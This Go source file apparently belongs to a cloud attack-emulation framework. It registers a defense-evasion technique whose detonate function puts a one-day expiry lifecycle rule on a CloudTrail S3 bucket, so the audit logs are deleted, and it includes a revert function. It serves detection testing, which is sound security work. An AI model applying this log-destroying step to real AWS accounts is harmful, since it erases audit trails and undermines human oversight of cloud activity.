package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/aws/aws-sdk-go-v2/service/s3/types"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.defense-evasion.cloudtrail-lifecycle-rule",
		FriendlyName:       "CloudTrail Logs Impairment Through S3 Lifecycle Rule",
		Platform:           stratus.AWS,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.DefenseEvasion},
		Description: `
Set a 1-day retention policy on the S3 bucket used by a CloudTrail Trail, using a S3 Lifecycle Rule.

References: https://www.justice.gov/usao-sdny/press-release/file/1452706/download

Warm-up: 

- Create a CloudTrail trail logging to a S3 bucket.

Detonation: 

- Apply a S3 Lifecycle Rule automatically removing objects after 1 day.
`,
		IsIdempotent:               false, // can't create twice a lifecycle rule with the same name
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string) error {
	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())
	bucketName := params["s3_bucket_name"]

	log.Println("Setting a short retention policy on CloudTrail S3 bucket " + bucketName)
	_, err := s3Client.PutBucketLifecycleConfiguration(context.Background(), &s3.PutBucketLifecycleConfigurationInput{
		Bucket: &bucketName,
		LifecycleConfiguration: &types.BucketLifecycleConfiguration{
			Rules: []types.LifecycleRule{
				{
					ID:         aws.String("nuke-cloudtrail-logs-after-1-day"),
					Status:     types.ExpirationStatusEnabled,
					Expiration: &types.LifecycleExpiration{Days: 1},
					Filter: &types.LifecycleRuleFilterMemberPrefix{
						Value: "*",
					},
				},
			},
		},
	})

	if err != nil {
		return errors.New("unable to create S3 Lifecycle Policy Rule: " + err.Error())
	}
	return nil
}

func revert(params map[string]string) error {
	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())
	bucketName := params["s3_bucket_name"]

	log.Println("Reverting S3 Lifecycle Rules on CloudTrail S3 bucket " + bucketName)
	_, err := s3Client.DeleteBucketLifecycle(context.Background(), &s3.DeleteBucketLifecycleInput{
		Bucket: &bucketName,
	})

	if err != nil {
		return errors.New("unable to revert S3 Lifecycle Policy Rule: " + err.Error())
	}
	return nil
}
